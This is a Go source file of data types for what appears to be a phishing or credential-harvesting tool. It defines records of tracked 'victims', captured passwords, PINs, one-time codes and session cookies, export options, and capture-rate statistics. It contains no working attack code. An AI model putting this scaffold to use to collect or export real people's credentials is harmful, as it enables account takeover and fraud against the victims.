package extract

import "time"

// Credential represents a captured credential
type Credential struct {
	VictimID    string            `json:"victim_id"`
	Username    string            `json:"username,omitempty"`
	Password    string            `json:"password,omitempty"`
	Email       string            `json:"email,omitempty"`
	CustomerID  string            `json:"customer_id,omitempty"`
	PIN         string            `json:"pin,omitempty"`
	OTP         string            `json:"otp,omitempty"`
	IPAddress   string            `json:"ip_address,omitempty"`
	UserAgent   string            `json:"user_agent,omitempty"`
	CapturedAt  time.Time         `json:"captured_at"`
	Target      string            `json:"target,omitempty"`
	SessionID   string            `json:"session_id,omitempty"`
	Cookies     []Cookie          `json:"cookies,omitempty"`
	ExtraFields map[string]string `json:"extra_fields,omitempty"`
}

// Cookie represents a captured cookie
type Cookie struct {
	Name     string    `json:"name"`
	Value    string    `json:"value"`
	Domain   string    `json:"domain,omitempty"`
	Path     string    `json:"path,omitempty"`
	Expires  time.Time `json:"expires,omitempty"`
	Secure   bool      `json:"secure"`
	HTTPOnly bool      `json:"http_only"`
}

// Session represents a victim session
type Session struct {
	ID        string            `json:"id"`
	VictimID  string            `json:"victim_id"`
	IPAddress string            `json:"ip_address"`
	UserAgent string            `json:"user_agent"`
	Cookies   []Cookie          `json:"cookies"`
	CreatedAt time.Time         `json:"created_at"`
	LastSeen  time.Time         `json:"last_seen"`
	Active    bool              `json:"active"`
	Metadata  map[string]string `json:"metadata,omitempty"`
}

// Victim represents a tracked victim
type Victim struct {
	ID           string       `json:"id"`
	IPAddress    string       `json:"ip_address"`
	UserAgent    string       `json:"user_agent"`
	FirstSeen    time.Time    `json:"first_seen"`
	LastSeen     time.Time    `json:"last_seen"`
	SessionCount int          `json:"session_count"`
	Credentials  []Credential `json:"credentials,omitempty"`
	Sessions     []Session    `json:"sessions,omitempty"`
}

// ExportFormat represents the export format type
type ExportFormat string

const (
	FormatCSV  ExportFormat = "csv"
	FormatJSON ExportFormat = "json"
	FormatXML  ExportFormat = "xml"
	FormatHTML ExportFormat = "html"
)

// ExportOptions contains options for exporting data
type ExportOptions struct {
	Format          ExportFormat
	OutputPath      string
	IncludeCookies  bool
	IncludeSessions bool
	MaskPasswords   bool
	FilterVictim    string
	FilterTarget    string
	StartDate       *time.Time
	EndDate         *time.Time
}

// Statistics represents extraction statistics
type Statistics struct {
	TotalVictims     int            `json:"total_victims"`
	TotalCredentials int            `json:"total_credentials"`
	TotalSessions    int            `json:"total_sessions"`
	ActiveSessions   int            `json:"active_sessions"`
	UniqueIPs        int            `json:"unique_ips"`
	CaptureRate      float64        `json:"capture_rate"`
	LastCapture      time.Time      `json:"last_capture,omitempty"`
	TargetBreakdown  map[string]int `json:"target_breakdown,omitempty"`
}
